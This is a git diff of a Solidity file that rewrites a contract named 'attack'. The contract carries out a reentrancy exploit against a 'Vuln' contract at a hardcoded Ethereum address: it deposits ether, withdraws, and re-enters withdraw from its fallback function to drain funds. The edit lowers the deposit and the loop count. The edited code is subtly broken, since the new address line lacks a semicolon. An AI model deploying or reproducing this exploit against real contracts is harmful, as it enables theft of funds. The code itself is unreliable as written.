@@ -23,33 +23,23 @@ contract Vuln {
 }
 
 contract attack {
-    address payable owner;
-    Vuln public vuln_wal = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
-    uint256 public count;
+    address vuln_addr = 0x36A540E3A78084962B75E25877CfACf8846Be018
+    Vuln vuln_cont = Vuln(vuln_addr);
+    uint256 count = 0;
 
-    constructor() public
+    function gimmeGimme() public payable 
     {
-        owner = msg.sender; 
-        count = 0;
-    }
-    
-    function atk() public payable
-    {
-        if (msg.value >= 0.1 ether)
-        {
-            vuln_wal.deposit.value(0.1 ether)();
-            vuln_wal.withdraw();
-        }
+         vuln_cont.deposit.value(0.01 ether)();
+	 vuln_cont.withdraw();
     }
 
     fallback () external payable 
     {
-        count++;
+        count += 1;
 
-        if (count < 8)
+        if (count < 3)
         {
-            vuln_wal.withdraw();
+            vuln_cont.withdraw();
         }
     }
-
 }
